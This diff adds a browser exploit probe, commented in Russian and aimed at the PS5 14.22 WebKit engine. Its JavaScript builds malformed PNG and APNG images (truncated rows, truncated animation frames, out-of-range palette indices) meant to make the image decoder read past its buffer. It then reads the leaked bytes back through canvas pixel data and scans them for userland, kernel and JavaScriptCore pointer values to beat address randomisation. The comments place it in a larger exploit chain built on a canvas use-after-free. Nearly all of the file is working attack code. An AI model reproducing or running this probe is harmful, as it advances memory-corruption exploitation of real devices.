@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<!--
+  l1-oob-read.html — канал OOB-READ (пере-read), PS5 14.22 WebKit 605.1.15/17.0-эра.
+
+  Контекст (см. recon/leak-hunt-1422.md):
+    * canvas-UAF даёт только порчу без адреса: zero-at-free (v931 100% избирательное
+      зануление), реклейм не наступает (v913 hits=0), forge жив, leak — нет.
+    * Поэтому ищем баг класса OOB-READ: декодер изображения читает БОЛЬШЕ, чем должен,
+      и прочитанные байты соседней памяти становятся видны в JS через
+      drawImage() -> getImageData(). Соседнюю память никто не зануляет — там могут быть
+      указатели (0x0000_xxxx_xxxx_xxxx — userland WebProcess, 0xffff_8xxx — kernel,
+      0xfffe_xxxx — JSC-теги).
+
+  Основание механик: публичные пробы v918 (APNG overread: "linear overread into LIVE
+  neighbor heap"; detection = bytes through getImageData, never floats), v920-v923
+  (APNG frame pipeline / width sweep / no-IDAT kill), p610 (PNG row truncation + palette
+  OOB), v674 (APNG overread как единственный публично заявленный leak-класс).
+
+  Варианты (каждый строится в JS, без внешних файлов):
+    V1 row-truncation: IHDR 64x64, IDAT со сжатыми данными ТОЛЬКО 1 строки (W*4+1 байт).
+       Декодер обязан дочитать 63 строки из соседней памяти либо отвергнуть файл.
+    V2 APNG fdAT-truncation: 2 кадра, fcTL 64x64, fdAT со сжатой 1 строкой;
+       ждём кадр 2 и читаем через drawImage.
+    V3 palette-OOB: color type 3 (PLTE 1 запись), пиксельные индексы 0xFF — декодер
+       может читать палитру/таблицу за границей.
+    V4 width-truncation: IHDR 16384x1 без IDAT + acTL/fcTL (kill-сигнатура v920-v923):
+       проверяем, доходит ли декодер до чтения (crash => OOB-путь есть, но краш не leak).
+
+  Критерий успеха (записан и в recon/leak-hunt-1422.md):
+    >=1 «канонический указатель» в пиксельных байтах: 8-байтовое слово, у которого
+    (a) старшие 32 бита == 0 и 0x1000 <= low32 < 0x80000000 (userland WebProcess), ИЛИ
+    (b) старшие 16 бит == 0xffff и слово != 0xffffffffffffffff (kernel/JSC),
+    ИЛИ (c) старшие 16 бит == 0xfffe (JSC cell-tag);
+    желательно — повторяемость на холодной загрузке и совпадение с ожидаемым
+    диапазоном 0x00000xxx_xxxxxxxx / 0xffff8xxx_xxxxxxxx.
+
+  Лог: #out на экране + GET /beacon/L1-... (если поднят стенд tools/probe/serve.py).
+-->
+<meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>L1 OOB-read (APNG/PNG decoder overread)</title>
+<body style="background:#000;color:#0f0;font:12px monospace">
+<pre id="out">L1 OOB-READ probe boot…</pre>
+<script>
+'use strict';
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+function bk(tag, data) {
+  var line = 'L1-' + tag + (data === undefined ? '' : ' ' + data);
+  say(line);
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', '/beacon/' + encodeURIComponent(line.slice(0, 700)) + '?t=' + Date.now(), true);
+    x.send();
+  } catch (e) {}
+}
+
+/* ============================== PNG/APNG builder ============================== */
+var CRC_TABLE = (function () {
+  var t = new Int32Array(256);
+  for (var n = 0; n < 256; n++) {
+    var c = n;
+    for (var k = 0; k < 8; k++) c = (c & 1) ? (0xEDB88320 ^ (c >>> 1)) : (c >>> 1);
+    t[n] = c;
+  }
+  return t;
+})();
+function crc32(bytes, start, end) {
+  var c = -1;
+  for (var i = start; i < end; i++) c = CRC_TABLE[(c ^ bytes[i]) & 0xff] ^ (c >>> 8);
+  return (c ^ -1) >>> 0;
+}
+function push32(a, v) { a.push(v & 255, (v >>> 8) & 255, (v >>> 16) & 255, (v >>> 24) & 255); }
+function pushBE32(a, v) { a.push((v >>> 24) & 255, (v >>> 16) & 255, (v >>> 8) & 255, v & 255); }
+function tag4(a, s) { for (var i = 0; i < 4; i++) a.push(s.charCodeAt(i) & 255); }
+function chunk(out, type, data) {
+  pushBE32(out, data.length);
+  var cs = out.length;
+  tag4(out, type);
+  for (var i = 0; i < data.length; i++) out.push(data[i] & 255);
+  pushBE32(out, crc32(out, cs, out.length));
+}
+/* zlib stored (без сжатия) */
+var ADLER_A = 1, ADLER_B = 0;
+function adler32(raw) {
+  var a = 1, b = 0;
+  for (var i = 0; i < raw.length; i++) { a = (a + raw[i]) % 65521; b = (b + a) % 65521; }
+  return ((b << 16) | a) >>> 0;
+}
+function zlibStored(raw) {
+  var out = [0x78, 0x01], i = 0;
+  while (i < raw.length) {
+    var blk = raw.slice(i, Math.min(i + 65535, raw.length));
+    i += blk.length;
+    out.push(i >= raw.length ? 1 : 0, blk.length & 255, (blk.length >> 8) & 255,
+      (~blk.length) & 255, ((~blk.length) >> 8) & 255);
+    for (var j = 0; j < blk.length; j++) out.push(blk[j]);
+  }
+  pushBE32(out, adler32(raw));
+  return out;
+}
+function ihdr(w, h, depth, colorType) {
+  var d = [];
+  pushBE32(d, w); pushBE32(d, h);
+  d.push(depth, colorType, 0, 0, 0);
+  return d;
+}
+function rawRows(w, h, rgba, rowsOverride) {
+  var rows = rowsOverride === undefined ? h : rowsOverride;
+  var raw = [];
+  for (var y = 0; y < rows; y++) {
+    raw.push(0); // filter none
+    for (var x = 0; x < w; x++) for (var c = 0; c < 4; c++) raw.push(rgba[c] & 255);
+  }
+  return raw;
+}
+function buildPNG(opts) {
+  var out = [];
+  tag4(out, '\x89PNG');
+  out.push(0x0D, 0x0A, 0x1A, 0x0A);
+  chunk(out, 'IHDR', ihdr(opts.w, opts.h, 8, opts.colorType === undefined ? 6 : opts.colorType));
+  if (opts.plte) chunk(out, 'PLTE', opts.plte);
+  var extra = opts.extra || [];
+  for (var e = 0; e < extra.length; e++) chunk(out, extra[e][0], extra[e][1]);
+  if (opts.idatRaw) chunk(out, 'IDAT', zlibStored(opts.idatRaw));
+  var frames = opts.frames || [];
+  for (var f = 0; f < frames.length; f++) chunk(out, frames[f][0], frames[f][1]);
+  chunk(out, 'IEND', []);
+  return out;
+}
+function dataURL(bytes) {
+  var bin = '';
+  for (var i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i] & 255);
+  return 'data:image/png;base64,' + btoa(bin);
+}
+
+/* ============================== variants ============================== */
+var PATTERN = [0x11, 0x22, 0x33, 0xFF];   // наш известный «свой» пиксель
+var VARIANTS = [
+  {
+    id: 'V1-row-truncation',
+    desc: 'IHDR 64x64, IDAT сжата 1 строка -> декодер должен дочитать 63 строки откуда-то',
+    build: function () {
+      var w = 64, h = 64;
+      return { w: w, h: h, bytes: buildPNG({ w: w, h: h, idatRaw: rawRows(w, h, PATTERN, 1) }) };
+    }
+  },
+  {
+    id: 'V2-apng-fdat-truncation',
+    desc: '2 кадра 64x64, fcTL 64x64, fdAT сжат 1 строкой; читаем кадр 2',
+    build: function () {
+      var w = 64, h = 64;
+      var acTL = []; pushBE32(acTL, 2); pushBE32(acTL, 0);
+      var fcTL0 = []; pushBE32(fcTL0, 0); pushBE32(fcTL0, w); pushBE32(fcTL0, h);
+      pushBE32(fcTL0, 0); pushBE32(fcTL0, 0); fcTL0.push(0, 0, 1, 100, 0, 0);
+      var idat = zlibStored(rawRows(w, h, [0x44, 0x55, 0x66, 0xFF], 1));
+      var fcTL1 = []; pushBE32(fcTL1, 1); pushBE32(fcTL1, w); pushBE32(fcTL1, h);
+      pushBE32(fcTL1, 0); pushBE32(fcTL1, 0); fcTL1.push(0, 0, 1, 100, 0, 0);
+      var fd = []; pushBE32(fd, 2);
+      var z = zlibStored(rawRows(w, h, PATTERN, 1));
+      for (var i = 0; i < z.length; i++) fd.push(z[i]);
+      return {
+        w: w, h: h, animated: true,
+        bytes: buildPNG({ w: w, h: h, extra: [['acTL', acTL], ['fcTL', fcTL0]],
+          idatRaw: null, frames: [['IDAT', idat], ['fcTL', fcTL1], ['fdAT', fd]] })
+      };
+    }
+  },
+  {
+    id: 'V3-palette-oob',
+    desc: 'color type 3, PLTE 1 запись, индексы 0xFF -> чтение палитры за границей',
+    build: function () {
+      var w = 64, h = 8;
+      var raw = [];
+      for (var y = 0; y < h; y++) { raw.push(0); for (var x = 0; x < w; x++) raw.push(0xFF); }
+      var plte = [0x00, 0x00, 0x00];
+      return { w: w, h: h, colorType: 3, plte: plte, bytes: buildPNG({ w: w, h: h, colorType: 3, plte: plte, idatRaw: raw }) };
+    }
+  },
+  {
+    id: 'V4-noIDAT-kill-signature',
+    desc: 'IHDR 16384x1 + acTL/fcTL без IDAT (kill-сигнатура v920-v923): проверка OOB-пути кадра',
+    build: function () {
+      var w = 16384, h = 1;
+      var acTL = []; pushBE32(acTL, 1); pushBE32(acTL, 0);
+      var fcTL = []; pushBE32(fcTL, 0); pushBE32(fcTL, w); pushBE32(fcTL, h);
+      pushBE32(fcTL, 0); pushBE32(fcTL, 0); fcTL.push(0, 0, 1, 100, 0, 0);
+      return { w: w, h: 1, bytes: buildPNG({ w: w, h: 1, extra: [['acTL', acTL], ['fcTL', fcTL]], idatRaw: null }) };
+    }
+  }
+];
+
+/* ============================== scan readback ============================== */
+function isPtrCandidate(v) {
+  if (!v) return false;
+  var hi32 = Number((v >> 32n) & 0xffffffffn);
+  var lo32 = Number(v & 0xffffffffn);
+  var hi16 = Number((v >> 48n) & 0xffffn);
+  if (hi32 === 0 && lo32 >= 0x1000 && lo32 < 0x80000000) return 'userland32';
+  if (hi16 === 0xffff && v !== 0xffffffffffffffffn) return 'kernel/JSC-tag';
+  if (hi16 === 0xfffe) return 'JSC-cell-tag';
+  if (hi16 === 0x0000 && lo32 !== 0 && (lo32 & 7) === 0) return 'canonical-userland';
+  return false;
+}
+function scanPixels(imgData, w, h) {
+  var bytes = imgData.data, u = new Uint8Array(bytes.buffer, bytes.byteOffset, bytes.byteLength);
+  var total = u.length, foreign = 0, cands = [], i;
+  // 1) «чужие» байты: не совпадают с нашим паттерном (по пикселям)
+  for (i = 0; i + 4 <= total; i += 4) {
+    if (u[i] !== PATTERN[0] || u[i + 1] !== PATTERN[1] || u[i + 2] !== PATTERN[2] || u[i + 3] !== PATTERN[3]) foreign += 4;
+  }
+  // 2) 8-байтовые окна: канонические адреса
+  for (i = 0; i + 8 <= total; i += 8) {
+    var v = 0n;
+    for (var k = 7; k >= 0; k--) v = (v << 8n) | BigInt(u[i + k]);
+    var kind = isPtrCandidate(v);
+    if (kind) {
+      var hex = v.toString(16); while (hex.length < 16) hex = '0' + hex;
+      cands.push({ off: i, kind: kind, hex: '0x' + hex });
+      if (cands.length >= 16) break;
+    }
+  }
+  return { total: total, foreign: foreign, cands: cands };
+}
+
+/* ============================== runner ============================== */
+var state = { idx: 0, results: [] };
+function finish() {
+  var ptr = 0;
+  state.results.forEach(function (r) { ptr += (r.ptrCands || []).length; });
+  bk('RESULTS', JSON.stringify(state.results.map(function (r) {
+    return { id: r.id, decode: r.decode, foreign: r.foreign, total: r.total, ptr: (r.ptrCands || []).length };
+  })));
+  if (ptr > 0) {
+    bk('SUCCESS', 'OOB-READ дал ' + ptr + ' указателеподобных слов — кандидат на утечку; смотреть L1-PTRCAND');
+  } else {
+    bk('NO-PTR', 'ни один вариант не дал канонических указателей; foreign>0 — слабый сигнал пере-read');
+  }
+  bk('DONE', 'вариантов=' + state.results.length + '/' + VARIANTS.length);
+}
+function runVariant(idx) {
+  if (idx >= VARIANTS.length) { finish(); return; }
+  var V = VARIANTS[idx];
+  var built;
+  try { built = V.build(); }
+  catch (e) { bk('BUILD-FAIL', V.id + ' ' + e); state.results.push({ id: V.id, decode: 'build-fail' }); runVariant(idx + 1); return; }
+  bk('BUILT', V.id + ' ' + built.bytes.length + 'B w=' + built.w + ' h=' + built.h);
+  var img = new Image();
+  var done = false;
+  var timer = setTimeout(function () {
+    if (done) return; done = true;
+    bk('DECODE-TIMEOUT', V.id);
+    state.results.push({ id: V.id, decode: 'timeout' });
+    runVariant(idx + 1);
+  }, 2500);
+  img.onerror = function () {
+    if (done) return; done = true; clearTimeout(timer);
+    bk('DECODE-FAIL', V.id);
+    state.results.push({ id: V.id, decode: 'fail' });
+    runVariant(idx + 1);
+  };
+  img.onload = function () {
+    function readout(tag) {
+      try {
+        var cv = document.createElement('canvas');
+        cv.width = Math.min(built.w, 2048); cv.height = Math.min(built.h, 2048);
+        var cx = cv.getContext('2d');
+        cx.fillStyle = '#000'; cx.fillRect(0, 0, cv.width, cv.height); // фон: foreign будет виден
+        cx.drawImage(img, 0, 0);
+        var data = cx.getImageData(0, 0, cv.width, cv.height);
+        var scan = scanPixels(data, cv.width, cv.height);
+        bk('STATS', V.id + ' ' + tag + ' total=' + scan.total + 'B foreign=' + scan.foreign +
+          'B ptrcands=' + scan.cands.length);
+        if (scan.cands.length) {
+          scan.cands.forEach(function (c) { bk('PTRCAND', V.id + ' ' + tag + ' off=' + c.off + ' kind=' + c.kind + ' ' + c.hex); });
+        }
+        state.results.push({ id: V.id, decode: 'ok', total: scan.total, foreign: scan.foreign,
+          ptrCands: scan.cands });
+      } catch (e) {
+        bk('READ-ERR', V.id + ' ' + tag + ' ' + e);
+      }
+    }
+    if (built.animated) {
+      readout('frame1');
+      setTimeout(function () { readout('frame2'); if (!done) { done = true; clearTimeout(timer); runVariant(idx + 1); } }, 450);
+    } else {
+      readout('static');
+      done = true; clearTimeout(timer);
+      runVariant(idx + 1);
+    }
+  };
+  img.src = dataURL(built.bytes);
+}
+
+bk('BOOT', 'l1-oob-read; variants=' + VARIANTS.length +
+  '; success=ptrCands>0 (userland 0x0000_xxxx или kernel/JSC 0xffff/0xfffe)');
+runVariant(0);
+</script>
